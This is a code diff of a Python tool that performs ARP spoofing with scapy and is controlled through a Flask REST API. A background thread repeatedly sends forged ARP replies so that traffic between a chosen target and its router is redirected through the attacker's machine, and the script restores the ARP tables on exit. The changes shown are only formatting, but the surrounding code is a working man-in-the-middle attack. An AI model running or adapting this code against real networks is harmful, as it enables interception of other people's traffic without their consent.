@@ -12,16 +12,16 @@ import threading
 
 # Gloabal Variables
 ##############################################################################
-OPERATION = 2                                     # Arp Response Package
-SLEEP_TIME = 5                                    # Sleep Time
-RESTORE_PKG_COUNT = 3                             # Restore Package Count
-SPOOFED_LIST = []                                 # List Of Spoofed Targets
-DEBUG = True                                      # Debug Mode
-PORT = 5002                                       # Port Number
-DAEMON_THREAD = True                              # Daemon Thread
+OPERATION           = 2                           # Arp Response Package
+SLEEP_TIME          = 5                           # Sleep Time
+RESTORE_PKG_COUNT   = 3                           # Restore Package Count
+SPOOFED_LIST        = []                          # List Of Spoofed Targets
+DEBUG               = True                        # Debug Mode
+PORT                = 5002                        # Port Number
+DAEMON_THREAD       = True                        # Daemon Thread
 
-app = Flask(__name__)
-api = Api(app)
+app                 = Flask(__name__)
+api                 = Api(app)
 ##############################################################################
 
 
@@ -55,12 +55,13 @@ def get_my_mac_addr():
 # Spoof ARP Function
 ##############################################################################
 def redirect_arp(dest_ip,dest_mac,source_ip,source_mac,send_pkg_count=1):
-    package = scapy.ARP()                         # ARP Package Generated
-    package.op = OPERATION                        # Set Operation to Response
-    package.pdst = dest_ip                        # Set Dest Ip Address
-    package.hwdst = dest_mac                      # Set Dest MAC Address
-    package.psrc = source_ip                      # Set Source Ip Address 
-    package.hwsrc = source_mac                    # Set Source MAC Address
+    package        = scapy.ARP()                  # ARP Package Generated
+    package.op     = OPERATION                    # Set Operation to Response
+    package.pdst   = dest_ip                      # Set Dest Ip Address
+    package.hwdst  = dest_mac                     # Set Dest MAC Address
+    package.psrc   = source_ip                    # Set Source Ip Address 
+    package.hwsrc  = source_mac                   # Set Source MAC Address
+
     scapy.send(package,count=send_pkg_count,      # Send the Package
             verbose=False)
 ##############################################################################
@@ -85,11 +86,11 @@ class ArpSpoof(Resource):
         else:
             my_mac_addr = get_my_mac_addr()
 
-        spoof_dict = {"target_ip_addr"  : target_ip_addr ,
-                      "target_mac_addr" : target_mac_addr,
-                      "router_ip_addr"  : router_ip_addr,
-                      "router_mac_addr" : router_mac_addr,
-                      "interceptor"     : my_mac_addr}
+        spoof_dict      = { "target_ip_addr"  : target_ip_addr ,
+                            "target_mac_addr" : target_mac_addr,
+                            "router_ip_addr"  : router_ip_addr,
+                            "router_mac_addr" : router_mac_addr,
+                            "interceptor"     : my_mac_addr }
         
         SPOOFED_LIST.append(spoof_dict)
 ##############################################################################
@@ -116,7 +117,8 @@ def send_spoof_packages():
                     redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)
 
                 time.sleep(SLEEP_TIME)
-    thread = threading.Thread(target=run)
+    # Threading
+    thread        = threading.Thread(target=run)
     thread.daemon = DAEMON_THREAD
     thread.start()
 ##############################################################################
@@ -163,13 +165,13 @@ if __name__ == '__main__':
                 print("Removing....")
                 print("Removing....")
                 print("Removing....")
-                print("\n\n########################################################################")
+                print("##########################################")
                 print("target_ip_addr : "+str(target_ip_addr))
                 print("target_mac_addr: "+str(target_mac_addr))
                 print("router_ip_addr : "+str(router_ip_addr))
                 print("router_mac_addr: "+str(router_mac_addr))
                 print("interceptor    : "+str(interceptor))
-                print("########################################################################")
+                print("##########################################")
         
         print("[+] Done!")
         print("[-] Quiting...")
